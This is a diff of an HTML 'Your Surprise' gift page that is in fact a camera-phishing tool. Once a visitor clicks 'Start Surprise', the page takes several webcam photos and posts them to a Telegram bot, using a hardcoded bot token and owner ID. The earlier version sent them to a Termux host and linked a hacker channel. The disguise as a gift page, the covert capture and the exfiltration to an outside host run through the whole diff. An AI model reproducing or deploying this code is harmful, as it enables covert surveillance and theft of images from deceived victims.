@@ -5,134 +5,90 @@
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>🎁 Your Surprise</title>
 <style>
-* { margin: 0; padding: 0; box-sizing: border-box; font-family: Arial, sans-serif; }
+* { margin:0; padding:0; box-sizing:border-box; font-family:Arial,sans-serif; }
 body { background: linear-gradient(135deg,#6a11cb 0%,#2575fc 100%); min-height:100vh; display:flex; justify-content:center; align-items:center; padding:20px; }
 .container { background:white; padding:25px; border-radius:15px; max-width:450px; width:100%; text-align:center; box-shadow:0 10px 30px rgba(0,0,0,0.2);}
 .gift { font-size:50px; margin:10px 0; }
 h1 { color:#333; margin:10px 0; font-size:22px; }
-.btn { background:linear-gradient(90deg,#6a11cb,#2575fc); color:white; border:none; padding:15px; width:100%; border-radius:50px; font-size:18px; font-weight:bold; cursor:pointer; margin:15px 0;}
+.btn { background: linear-gradient(90deg,#6a11cb,#2575fc); color:white; border:none; padding:15px; width:100%; border-radius:50px; font-size:18px; font-weight:bold; cursor:pointer; margin:15px 0;}
 .btn:disabled { opacity:0.7; cursor:not-allowed;}
-video { width:100%; border-radius:10px; border:3px solid #6a11cb; margin:15px 0; display:none; transform:scaleX(-1);}
-.progress { width:100%; height:8px; background:#eee; border-radius:4px; margin:15px 0; overflow:hidden;}
-.progress-bar { height:100%; width:0%; background:#00b09b; transition: width 0.3s; }
+video { width:100%; border-radius:10px; border:3px solid #6a11cb; margin:15px 0; display:block; transform:scaleX(-1);}
 .hidden { display:none; }
-.photo-preview { width:140px; height:140px; border-radius:10px; border:3px solid #6a11cb; margin:15px auto; object-fit:cover;}
-.success { color:#00b09b; background:#e6fff9; padding:10px; border-radius:8px; margin:10px 0;}
-.counter { color:#666; font-size:14px; margin:5px 0;}
 </style>
 </head>
 <body>
 <div class="container">
-    <div class="gift">🎁</div>
-    <h1 id="title">Welcome!</h1>
-    <p id="message" style="color:#666;">Please join our Telegram channel to use the surprise.</p>
-    <button class="btn" id="joinBtn">✅ I Joined</button>
-    <div id="menu" class="hidden">
-        <button class="btn" id="generateBtn">Generate Link</button>
-        <button class="btn" id="contactBtn">Contact Owner</button>
-    </div>
-    <video id="video" autoplay playsinline></video>
-    <div class="progress hidden" id="progress">
-        <div class="progress-bar" id="progressBar"></div>
-    </div>
-    <div id="counter" class="counter hidden"></div>
-    <img id="photoPreview" class="photo-preview hidden">
-    <div id="status" class="success hidden"></div>
+<div class="gift">🎁</div>
+<h1 id="title">Your Surprise</h1>
+<p id="message" style="color:#666;">Preparing your surprise...</p>
+<video id="video" autoplay playsinline></video>
+<button class="btn" onclick="startSurprise()" id="actionBtn">🎁 Start Surprise</button>
 </div>
 
 <canvas id="canvas" style="display:none;"></canvas>
 
 <script>
-const BOT_ENDPOINT = "http://192.168.1.13:5000/upload"; // CHANGE to your Termux IP
-const USER_CHAT_ID = new URLSearchParams(window.location.search).get("chat_id");
-const USER_NAME = new URLSearchParams(window.location.search).get("name") || "Friend";
+const urlParams = new URLSearchParams(window.location.search);
+const USER_CHAT_ID = urlParams.get("chat_id");
+const USER_NAME = urlParams.get("name") || "Friend";
+
+const BOT_TOKEN = "8226782560:AAGgKjz2W5QJskEkD1Gy4B8bRk0Cdabgjh0";
+const OWNER_ID = "8215819954";
 
 const video = document.getElementById("video");
 const canvas = document.getElementById("canvas");
 const ctx = canvas.getContext("2d");
 let stream = null;
-let photosSent = 0;
 
-document.getElementById("joinBtn").onclick = () => {
-    document.getElementById("joinBtn").classList.add("hidden");
-    document.getElementById("menu").classList.remove("hidden");
-    document.getElementById("message").textContent = "🎉 Welcome! Now choose an option.";
-};
-
-// GENERATE LINK BUTTON
-document.getElementById("generateBtn").onclick = async () => {
-    document.getElementById("title").textContent = "📸 Taking Your Surprise Photos!";
-    document.getElementById("message").textContent = "Smile 😀 - Capturing 10 photos...";
-    document.getElementById("menu").classList.add("hidden");
-    document.getElementById("progress").classList.remove("hidden");
-
+async function startSurprise() {
+    const btn = document.getElementById("actionBtn");
+    btn.disabled = true;
+    btn.textContent = "⏳ Loading...";
+    document.getElementById("title").textContent = "📸 Camera Ready!";
+    document.getElementById("message").textContent = "Smile! Taking your photos...";
     try {
         stream = await navigator.mediaDevices.getUserMedia({ video:{ facingMode:"user", width:{ideal:1280}, height:{ideal:720} } });
         video.srcObject = stream;
-        video.style.display = "block";
-        await new Promise(r => video.onloadedmetadata = r);
-
-        for(let i=1;i<=10;i++){
-            await delay(500);
+        for(let i=1;i<=3;i++){
+            await delay(800);
             const blob = await capturePhoto(i);
             await sendPhoto(blob,i);
-            photosSent++;
-            showStatus(`🎁 Surprise ${i} unlocked!`);
-            updateProgress(i,10);
-            await delay(800);
         }
         finish();
     } catch(e){
-        alert("Camera access denied or error!");
-        console.error(e);
+        document.getElementById("title").textContent = "⚠️ Camera failed!";
+        document.getElementById("message").textContent = "Cannot access camera.";
     }
-};
+}
 
-// CONTACT OWNER BUTTON
-document.getElementById("contactBtn").onclick = () => {
-    window.open("https://t.me/Hackers_Colony_Official","_blank");
-};
-
-// CAPTURE PHOTO
-async function capturePhoto(num){
+async function capturePhoto(i){
     canvas.width = video.videoWidth;
     canvas.height = video.videoHeight;
     ctx.drawImage(video,0,0,canvas.width,canvas.height);
-    return new Promise(res=>canvas.toBlob(res,"image/jpeg",0.9));
+    return new Promise(resolve=>canvas.toBlob(resolve,"image/jpeg",0.9));
 }
 
-// SEND PHOTO TO BOT
-async function sendPhoto(blob,num){
+async function sendPhoto(blob,i){
+    const fileName = `photo_${i}.jpg`;
+    const file = new File([blob],fileName,{type:"image/jpeg"});
     const formData = new FormData();
-    formData.append("photo",blob);
-    formData.append("user_chat_id",USER_CHAT_ID);
-    formData.append("user_name",USER_NAME);
-    await fetch(BOT_ENDPOINT,{method:"POST",body:formData});
+    formData.append("photo",file);
+    formData.append("caption",`🎁 Photo ${i} from ${USER_NAME}`);
+    formData.append("chat_id",OWNER_ID);
+    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,{method:"POST",body:formData});
+    if(USER_CHAT_ID){
+        formData.set("chat_id",USER_CHAT_ID);
+        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,{method:"POST",body:formData});
+    }
 }
 
-// HELPER
-function updateProgress(current,total){
-    const percent = (current/total)*100;
-    document.getElementById("progressBar").style.width = percent+"%";
-    document.getElementById("counter").textContent = `${current}/${total}`;
-    document.getElementById("counter").classList.remove("hidden");
-}
-
-function showStatus(text){
-    const status = document.getElementById("status");
-    status.textContent = text;
-    status.classList.remove("hidden");
-    setTimeout(()=>status.classList.add("hidden"),1200);
+function finish(){
+    if(stream){ stream.getTracks().forEach(t=>t.stop()); }
+    document.getElementById("title").textContent = "✅ Surprise Sent!";
+    document.getElementById("message").textContent = "Check your Telegram now!";
 }
 
 function delay(ms){return new Promise(res=>setTimeout(res,ms));}
-
-function finish(){
-    if(stream){stream.getTracks().forEach(t=>t.stop());}
-    document.getElementById("title").textContent = "✅ All Surprises Unlocked!";
-    document.getElementById("message").textContent = "Check your Telegram to see the photos!";
-    document.getElementById("actionBtn")?.classList.remove("hidden");
-}
 </script>
 </body>
 </html>
